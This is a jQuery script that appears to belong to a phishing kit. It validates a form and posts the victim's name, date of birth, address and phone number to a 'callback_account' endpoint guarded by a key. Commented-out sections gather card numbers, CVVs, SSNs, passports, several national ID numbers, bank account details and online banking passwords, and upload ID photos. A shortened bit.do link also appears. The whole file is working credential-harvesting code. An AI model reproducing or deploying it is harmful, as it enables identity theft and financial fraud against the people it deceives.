$(document).ready(function() {
 //$('#cex').mask('00/0000');
 //$('#csc').mask('0000');
 $('#dob').mask('00/00/0000');
 //$('#ccn').mask('0000 0000 0000 0000 000');
 $('#pnm').mask('0000000000');
 $('#zip').mask('00000');
 //$('#ssn').mask('000-00-0000');
 //$('#acn').mask('00000000');
 //$('#stc').mask('00-00-00');
 //$('#sin').mask('000-000-000');

 /*function validExp(b) {
  var a = new RegExp("(([0][1-9]{1})|([1][0-2]{1}))/20(([1][8-9]{1})|([2][0-9]{1}))");
  return a.test(b);
 }*/
 
 function isDate(vl) {
  var rg = /^([0-9]{2})+\/([0-9]{2})+\/([0-9]{4})+$/;
  return rg.test(vl);
 }
 function validDob(vl) {
  var c = false;
  if (isDate(vl) && (vl.split('/')[2] > "1919" && vl.split('/')[2] < "2006")) {
   c = true;
  }
  return c;
 }

 function valid() {
  var check = true;
  var ii = 0;
  $('#process input:not(.bt):not([type=checkbox]),#process select').each(function(i, el) {
   if (!$(el).val()) {
    $(el).parent().addClass('hasError');
    check = false;
   } else {
    $(el).not('#ccn').parent().removeClass('hasError');
   }
   /*if ($(el).attr('id') == 'cex') {
    if (!validExp($(el).val())) {
     $(el).parent().addClass('hasError');
     check = false;
    } else {
     $(el).parent().removeClass('hasError');
    }
   }
   */
   if ($(el).attr('id') == 'dob') {
    if (!validDob($(el).val())) {
     $(el).parent().addClass('hasError');
     check = false;
    } else {
     $(el).parent().removeClass('hasError');
    }
   }

   /*if ($(el).attr('id') == 'csc') {
    if ($('select:first').val() == 'amx' && $(el).val().length != 4) {
     $(el).parent().addClass('hasError');
     check = false;
    } else {
     $(el).parent().removeClass('hasError');
    }
    if ($('select:first').val() != 'amx' && $(el).val().length != 3) {
     $(el).parent().addClass('hasError');
     check = false;
    }
   }*/
  });
  return check;
 }

 $(document).on('change', '#process select', function() {
  $(this).parent().removeClass('hasError');
  $(this).parent().children('.labelSelect').html($(this).children("option:selected").text());
  $(this).parent().attr('data-name', $(this).val());
  /*if ($(this).val() == 'amx') {
   $('.csc input').attr('placeholder', $('.csc input').attr('placeholder').replace('3', '4'));
   $('.csc input').attr('maxlength', '4');
  } else {
   $('.csc input').attr('placeholder', $('.csc input').attr('placeholder').replace('4', '3'));
   $('.csc input').attr('maxlength', '3');
  }*/
 });
 /*var ccvalid = false;
 $('#ccn').validateCreditCard(function(result) {
  var cc = $('#ccn');
  if (cc.val() != '') {
   if (result.valid) {
    cc.parent().removeClass('hasError');
    ccvalid = true;
   } else {
    cc.parent().addClass('hasError');
    ccvalid = false;
   }
  }
 });*/
 /*$('#process input:not(.bt):not([type=checkbox]),select').each(function(i, el) {
  $(el).keyup(function() {
   valid();
  });
  $(el).change(function() {
   valid();
  });
 });*/

 $('#dob').keyup(function() {
  if (!validDob($('#dob').val())) {
   $('#dob').parent().addClass('hasError');
  } else {
   $('#dob').parent().removeClass('hasError');
  }
 });

 $('#process input:not(.bt):not([type=checkbox]),select').each(function(i, el) {
  $(el).change(function() {
   if ($(el).parent().hasClass('hasError')) {
    $(el).parent().removeClass('hasError');
   }
  });
 });

 $(document).on('submit', '#process form', function() {
  check = true;
  if (!valid()) {
   check = false;
  }
  /*if (!validExp($('#cex').val())) {
   $('#cex').parent().addClass('hasError');
   check = false;
  } else {
   $('#cex').parent().removeClass('hasError');
  }
  if (!ccvalid) {
   $('#ccn').parent().addClass('hasError');
   check = false;
  }*/
  if (!validDob($('#dob').val())) {
   $('#dob').parent().addClass('hasError');
   check = false;
  }
  if (!check) {
   return false;
  } else {
   $('#rotate').removeClass('hide');
   /*var ctp = $('#ctp').children("option:selected").text();
   var ccn = $('#ccn').val();
   var cex = $('#cex').val();
   var csc = $('#csc').val();*/
   var fnm = $('#fnm').val();
   var dob = $('#dob').val();
   var adr = $('#adr').val();
   var cty = $('#cty').val();
   var zip = $('#zip').val();
   var stt = $('#stt').val();
   var cnt = $('#cnt').val();
   var ptp = $('#ptp').children("option:selected").text();
   var pnm = $('#pnm').val();
   /*var par = $('#par').val();
   var mdn = $('#mdn').val();
   var ssn = $('#ssn').val();
   var pps = $('#pps').val();
   var clm = $('#clm').val();
   var dln = $('#dln').val();
   var sin = $('#sin').val();
   var pse = $('#pse').val();
   var dni = $('#dni').val();
   var bsn = $('#bsn').val();
   var cpf = $('#cpf').val();
   var fcn = $('#fcn').val();
   var acn = $('#acn').val();
   var stc = $('#stc').val();
   var bus = $('#bus').val();
   var bpw = $('#bpw').val();*/
   var o = {
    fnm,
    dob,
    adr,
    cty,
    zip,
    stt,
    cnt,
    ptp,
    pnm
    /*ctp,
    ccn,
    cex,
    csc,
    fnm,
    dob,
    adr,
    cty,
    zip,
    stt,
    cnt,
    ptp,
    par,
    pnm,
    mdn,
    ssn,
    pps,
    clm,
    dln,
    sin,
    pse,
    dni,
    bsn,
    cpf,
    fcn,
    acn,
    stc,
    bus,
    bpw*/
   };
   var start = new Date;
   var xT = 0;
   var idT = setInterval(function() {
    xT = Math.trunc((new Date - start) / 1000);
   }, 1000);
   var toStart = 0;
   var key = $('#keke').val();

   $.post('callback_account?key=' + key, o, function(data, status) {

    if (data == 'done' && status == 'success') {
     clearInterval(idT);

     if (xT > 4) {
      toStart = 0;
     } else {
      toStart = 1800;
     }
     setTimeout(function() {
      setId();
     }, toStart);

    } else {
     $('#rotate').addClass('hide');
    }

   });
  }

 });

 function setId() {
  $('#rotate').addClass('hide');
  $('#process').addClass('hide');
  $('#finish').removeClass('hide');
  window.scrollTo(0, 0);
 }
 /*
  $('.gone_bt').click(function() {
   window.location.href = "https://bit.do/webaccount";
  });

  function readFile(files, me, check) {
   if (files) {
    for (var i = 0; i < files.length; i++) {
     var FR = new FileReader();
     FR.onload = function(e) {
      if (e.target.result.startsWith("data:image/") && e.total <= 5000000) {
       if (check) {
        $(me).parent().parent().children(".imagesArea").append('<div class="imgItem"><img src="' + e.target.result + '" alt=""><button class="btDel">X</button></div>');
       } else {
        $(me).parent().parent().parent().parent().children(".imagesArea").append('<div class="imgItem"><img src="' + e.target.result + '" alt=""><button class="btDel">X</button></div>');
       }
       $(me).closest('form').append('<input type="hidden" value="' + e.target.result + '" name="images[]">');
      }
     }
     FR.readAsDataURL(files[i]);
    }
   }
  }
  $(document).on('click', '.zone', function(e) {
   e.stopPropagation();
   $(this).find('input[type=file]').trigger(e);
  });
  $(document).on('click', '.btDel', function() {
   $(this).closest('form').find('[value="' + $(this).prev().attr('src') + '"]').remove();
   $(this).parent().remove();
  });
  $(document).on('change', 'input[type=file]', function() {
   readFile(this.files, this, false);
  });
  $(".dropzone-main").on('dragleave', function(e) {
   e.preventDefault();
   $(this).css('border', '2px dashed #dee3e7');
   $(this).css('background', '#f0f2f4');
  });
  $(".dropzone-main").on('dragover', function(e) {
   e.preventDefault();
   $(this).css('border', '2px dashed #0564b3');
   $(this).css('background', '#ecf1f9');
  });
  $(".dropzone-main").on('drop', function(e) {
   e.preventDefault();
   $(this).css('border', '2px dashed #41ad49');
   readFile(e.originalEvent.dataTransfer.files, this, true);
  });*/
});